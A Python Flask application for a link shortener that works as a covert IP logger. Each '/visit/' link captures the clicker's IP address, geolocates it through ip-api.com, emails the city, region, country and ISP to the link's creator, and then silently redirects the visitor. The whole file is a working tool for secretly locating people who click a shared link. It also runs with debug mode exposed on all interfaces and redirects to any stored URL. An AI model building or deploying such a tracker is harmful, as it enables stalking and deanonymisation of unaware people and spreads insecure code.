from flask import Flask, request, render_template, redirect, jsonify
import os
import json
import uuid
import requests
import smtplib
from email.message import EmailMessage
import threading
from dotenv import load_dotenv
import sys

load_dotenv()

app = Flask(__name__)

DB_FILE = "url_db.json"
db_lock = threading.Lock()

EMAIL_ADDRESS = os.getenv("EMAIL")
EMAIL_PASSWORD = os.getenv("EMAIL_PASS")

# Log config on startup
print(f"[CONFIG] EMAIL set: {'YES' if EMAIL_ADDRESS else 'NO - MISSING!'}", flush=True)
print(f"[CONFIG] EMAIL_PASS set: {'YES' if EMAIL_PASSWORD else 'NO - MISSING!'}", flush=True)


def load_db():
    with db_lock:
        if os.path.exists(DB_FILE):
            with open(DB_FILE, 'r') as f:
                return json.load(f)
        return {}


def save_db(data):
    with db_lock:
        with open(DB_FILE, 'w') as f:
            json.dump(data, f, indent=4)


def get_geolocation(ip):
    try:
        res = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        data = res.json()
        print(f"[GEO] IP={ip} -> {data.get('city', '?')}, {data.get('country', '?')}", flush=True)
        return data
    except Exception as e:
        print(f"[GEO ERROR] {e}", flush=True)
        return {}


# ---------- EMAIL ----------
def send_email_alert(ip_data, short_code, recipient_email):
    try:
        print(f"[EMAIL] Preparing email to {recipient_email}...", flush=True)
        print(f"[EMAIL] From: {EMAIL_ADDRESS}", flush=True)

        if not EMAIL_ADDRESS or not EMAIL_PASSWORD:
            print("[EMAIL ERROR] EMAIL or EMAIL_PASS environment variable is not set!", flush=True)
            return

        msg = EmailMessage()
        msg['Subject'] = f"Visitor Alert /{short_code}"
        msg['From'] = EMAIL_ADDRESS
        msg['To'] = recipient_email

        body = f"""
Visitor Alert!

Short Code: {short_code}
IP: {ip_data.get('query', 'N/A')}
City: {ip_data.get('city', 'N/A')}
Region: {ip_data.get('regionName', 'N/A')}
Country: {ip_data.get('country', 'N/A')}
ISP: {ip_data.get('isp', 'N/A')}
"""
        msg.set_content(body)

        print("[EMAIL] Connecting to smtp.gmail.com:587 (STARTTLS)...", flush=True)
        with smtplib.SMTP("smtp.gmail.com", 587, timeout=15) as smtp:
            smtp.set_debuglevel(1)
            smtp.ehlo()
            smtp.starttls()
            smtp.ehlo()

            print("[EMAIL] Logging in...", flush=True)
            smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)

            print("[EMAIL] Sending message...", flush=True)
            smtp.send_message(msg)

        print(f"[EMAIL OK] Email sent to {recipient_email}", flush=True)

    except smtplib.SMTPAuthenticationError as e:
        print(f"[EMAIL AUTH ERROR] Gmail rejected login. Check your App Password! Error: {e}", flush=True)
    except smtplib.SMTPConnectError as e:
        print(f"[EMAIL CONNECT ERROR] Cannot connect to Gmail SMTP: {e}", flush=True)
    except smtplib.SMTPException as e:
        print(f"[EMAIL SMTP ERROR] {type(e).__name__}: {e}", flush=True)
    except Exception as e:
        print(f"[EMAIL ERROR] {type(e).__name__}: {e}", flush=True)


# ---------- BACKGROUND ----------
def background_task(ip, code, email):
    print(f"[TASK] Starting background task for code={code}, ip={ip}", flush=True)
    geo_data = get_geolocation(ip)
    geo_data["query"] = ip
    send_email_alert(geo_data, code, email)
    print(f"[TASK] Background task complete for code={code}", flush=True)


# ---------- ROUTES ----------
@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        url = request.form.get("url")
        recipient_email = request.form.get("to_email")

        if not url.startswith("http"):
            url = "http://" + url

        short_code = uuid.uuid4().hex[:6]

        db = load_db()
        db[short_code] = {"url": url, "email": recipient_email}
        save_db(db)

        short_url = request.host_url + "visit/" + short_code
        print(f"[LINK] Created {short_code} -> {url} (notify: {recipient_email})", flush=True)
        return render_template("index.html", short_url=short_url)

    return render_template("index.html")


@app.route('/visit/<code>')
def track(code):
    db = load_db()
    entry = db.get(code)

    if not entry:
        return "Invalid link", 404

    real_url = entry["url"]
    recipient_email = entry["email"]

    ip_header = request.headers.get("X-Forwarded-For", request.remote_addr)
    ip = ip_header.split(",")[0].strip() if "," in ip_header else ip_header

    print(f"[VISIT] code={code}, ip={ip}, redirect={real_url}", flush=True)

    thread = threading.Thread(
        target=background_task,
        args=(ip, code, recipient_email),
        daemon=True
    )
    thread.start()

    return redirect(real_url)


# ---------- HEALTH / DEBUG ----------
@app.route('/health')
def health():
    return jsonify({
        "status": "ok",
        "email_configured": bool(EMAIL_ADDRESS and EMAIL_PASSWORD),
        "email_from": EMAIL_ADDRESS[:3] + "***" if EMAIL_ADDRESS else None,
    })


# ---------- MAIN ----------
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(debug=True, host="0.0.0.0", port=port)